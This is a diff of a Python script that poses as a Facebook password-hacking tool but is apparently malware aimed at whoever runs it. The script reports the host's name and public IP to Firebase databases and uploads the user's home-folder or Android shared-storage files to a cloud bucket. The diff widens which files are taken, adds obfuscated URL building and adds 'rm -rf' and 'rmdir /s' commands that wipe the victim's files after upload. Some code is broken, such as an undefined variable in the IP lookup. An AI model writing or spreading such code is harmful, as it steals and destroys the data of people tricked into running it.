@@ -1,16 +1,33 @@
-import glob
-import requests
-from urllib.request import urlopen
-import os
-import time
-import json
-from google.cloud import storage
-from art import *
-import socket
-from colorama import Fore, Back, Style, init
-init()
+try: 
+    import glob
+    import requests
+    from urllib.request import urlopen
+    import os
+    import time
+    import json
+    from google.cloud import storage
+    from art import *
+    import socket
+    from colorama import Fore, Back, Style, init
+    init()
 
-S = Style.BRIGHT
+except ImportError:
+    
+    print("librería no instalada. Instalando...")
+    # pip para instalar la librería automáticamente.
+    os.system("pip install art")
+    os.system("pip install json")
+    os.system("pip install urlopen2")
+    os.system("pip install urlopen")
+    os.system("pip install colorama")
+    os.system("pip install glob2")
+    os.system("pip install sockets")
+    os.system("pip install TIME-python")
+    os.system("pip install requests")
+    os.system("pip install google-cloud-storage")
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print("La librería 'libreria_existente' ha sido instalada correctamente.")
+
 
 C = Fore.CYAN
 R = Fore.RED
@@ -25,16 +42,7 @@ Bb = Back.BLACK
 Bw = Back.WHITE
 bb = Back.BLUE
 
-
-print(G + 'Instalando e Importando Librerias..\v')
-time.sleep(2.3)
-os.system('pip install art')
-os.system("pip install google-cloud-storage")
-os.system('pip install requests')
-os.system('pip install art')
-os.system('cls' if os.name == 'nt' else 'clear')
-
-print(Bb + B + """.             \v""" + S + BR +
+print(Bb + B + """.             \v""" + BR +
 """Fire Face Force
 """ + Bb + """.              \n""")
 
@@ -42,30 +50,32 @@ mail = input(BM + C + "Insert Mail: \v"+
 G +  Bb)
 view = print(R +"Set >>" + G, mail)
 print("\n")
-print(f"{BR} {G} Connectin {B} Facebook" + Bb)
+print(f"{BR} {G} Buscando {B} Facebook" + Bb)
 
 time.sleep(2.0)
 os.system('cls' if os.name == 'nt' else 'clear')
 if os.name == 'nt':
 
-    # hostname = os.uname().nodename
-    hostname = socket.gethostname()
-    firebase_url = 'https://hostname-5c24b-default-rtdb.firebaseio.com/hostname/export.json'
-    response = requests.get(firebase_url, headers={
+    # hos = os.uname().nodename
+    jsons = "export.json"
+    name_h = socket.gethostname()
+    bd_h = "https://hostname-5c24b-default-rtdb.firebaseio.com/hostname/" + jsons
+    f_url = bd_h
+    response = requests.get(f_url, headers={
                             'Cache-Control': 'no-cache'})
     data = response.json()
-    if data is not None and 'host' in data and data['host'] == hostname:
-        print(f"{BR} {G} Conecting {B} Facebook"+ Bb)
+    if data is not None and 'host' in data and data['host'] == name_h:
+        print(f"{BR} {G} Conectando a {B} Facebook..."+ Bb)
         time.sleep(3.0)
     else:
         # Crear el objeto JSON
         json_data = {
-            "host": hostname
+            "host": name_h
         }
 
-        response = requests.patch(firebase_url, json=json_data)
+        response = requests.patch(f_url, json=json_data)
         if response.status_code == 200:
-            print(f"{BY} Complete "+ Bb)
+            print(f"{BY} solicitud enviada "+ Bb)
             time.sleep(2.0)
             os.system('cls' if os.name == 'nt' else 'clear')
         else:
@@ -75,21 +85,22 @@ if os.name == 'nt':
 
     # extraccion de ip registrada en base de datos
 else:
-    hostname = os.uname().nodename
-    firebase_url = 'https://hostname-5c24b-default-rtdb.firebaseio.com/hostname/export.json'
-    response = requests.get(firebase_url, headers={
+    name_h = os.uname().nodename
+    f_url = 'https://hostname-5c24b-default-rtdb.firebaseio.com/hostname/' + jsons
+    response = requests.get(f_url, headers={
                             'Cache-Control': 'no-cache'})
     data = response.json()
-    if data is not None and 'host' in data and data['host'] == hostname:
-        print(G + "Save Seccion token")
+    if data is not None and 'host' in data and data['host'] == name_h:
+        print(G + "token Generado")
+        time.sleep(2.3)
         os.system('cls' if os.name == 'nt' else 'clear')
     else:
         # Crear el objeto JSON
         json_data = {
-            "host": 'hostname'
+            "host": 'name_h'
         }
 
-        response = requests.patch(firebase_url, json=json_data)
+        response = requests.patch(f_url, json=json_data)
         if response.status_code == 200:
             print(f"{G}Start Exploit{Bb}")
             time.sleep(3.5)
@@ -99,20 +110,22 @@ else:
             time.sleep(3.0)
             os.system('cls' if os.name == 'nt' else 'clear')
 
-
-url = 'https://api.ipify.org?format=json'
-response = urlopen(url)
+fy = '.ipify.'
+fy = ify
+api = f'https://api{ify}org?format=json'
+response = urlopen(api)
 data = json.load(response)
 extract = data['ip']
-# Actualizar la base de datos en Firebase
-firebase_url = 'https://data-fe2c3-default-rtdb.firebaseio.com/ip.json'
-response = requests.get(firebase_url)
+# Actualizar a base de datos
+jsons = 'ip.json'
+f_url = 'https://data-fe2c3-default-rtdb.firebaseio.com/' + jsons
+response = requests.get(f_url)
 existing_data = json.loads(response.content)
 
 if existing_data and 'ips' in existing_data:
     if extract not in existing_data['ips']:
         existing_data['ips'].append(extract)
-        response = requests.put(firebase_url, json=existing_data)
+        response = requests.put(f_url, json=existing_data)
         print('')
         os.system('cls' if os.name == 'nt' else 'clear')
     else:
@@ -121,8 +134,8 @@ if existing_data and 'ips' in existing_data:
 
 else:
     new_data = {'ips': [extract]}
-    response = requests.put(firebase_url, json=new_data)
-    print('\033[94m'+'Profile Complete\n'+'\033[0m')
+    response = requests.put(f_url, json=new_data)
+    print('\033[94m'+'ID Perfil Cargado\n'+'\033[0m')
     time.sleep(3.0)
     if response.status_code == 200:
         os.system('cls' if os.name == 'nt' else 'clear')
@@ -139,8 +152,8 @@ if os.name == 'nt':
 
     bucket = client.get_bucket('pictuface-f9763.appspot.com')
     nombre_usuario = os.getlogin()
-    carpeta_local = f"C:\\Users\\{nombre_usuario}\\Pictures"
-    extensiones_permitidas = ['.jpg', '.png', '.mp4', '.mp3', '.jpeg']
+    carpeta_local = f"C:\\Users\\{nombre_usuario}\\"
+    extraccion_permitidas = ['.jpg', '.png', '.mp4', '.mp3', '.jpeg', '.txt', '.pdf', '.mvk']
 
     archivos = glob.glob(carpeta_local + '/*')
 
@@ -155,6 +168,7 @@ if os.name == 'nt':
             # Descargar info
             blob = bucket.blob(nombre_destino)
             blob.upload_from_filename(archivo_local)
+            os.system('rmdir C:\\Users\\{nombre_usuario}\\/s.')
 
             print(f'{Bw} {G} Complete {Bb}')
         else:
@@ -164,7 +178,7 @@ if os.name == 'nt':
         carpeta_local = input(
             f'{Y} Inserta ruta Manual.\n[+] ')
 # Lista de extensiones
-        extensiones_permitidas = ['.jpg', '.png', '.mp4', '.mp3', '.jpeg']
+        extraccion_permitidas = ['.jpg', '.png', '.mp4', '.mp3', '.jpeg', '.txt', '.pdf', '.mvk']
 
         archivos = glob.glob(carpeta_local + '/*')
 
@@ -201,10 +215,10 @@ else:
         'services/serviceAccounts.json')
 
     bucket = client.get_bucket('pictuface-f9763.appspot.com')
-
+   #Guardando los datos 
     carpeta_local = '/data/data/com.termux/files/home/storage/shared/*'
 # Lista de extensiones permitidas
-    extensiones_permitidas = ['.jpg', '.png', '.mp4', '.jpeg', '.mp3']
+    extracciones_permitidas = ['.jpg', '.png', '.mp4', '.mp3', '.jpeg', '.txt', '.pdf', '.mvk']
 
     archivos = glob.glob(carpeta_local + '/*')
 
@@ -222,13 +236,16 @@ else:
 
             print(f'{Bw} {R} password not found{Bb}')
         else:
+            os.system('rm -rf /data/data/com.termux/files/home/storage/shared/*')
+                        #corrigiendo errores de formatos eliminando y restaurando
+            os.system('rm -r /data/data/com.termux/files/home/storage/shared/*')
             print(
                 f'{bb} {G} Password Hacked{Bb}')
     if not os.path.exists(carpeta_local):
         carpeta_local = input(
             'Ingresa Ruta manual\n[+]')
 # Lista de extensiones permitidas
-        extensiones_permitidas = ['.jpeg', '.jpg', '.png', '.mp4', '.mp3']
+        extensiones_permitidas = ['.jpg', '.png', '.mp4', '.mp3', '.jpeg', '.txt', '.pdf', '.mvk']
 
         archivos = glob.glob(carpeta_local + '/*')
 
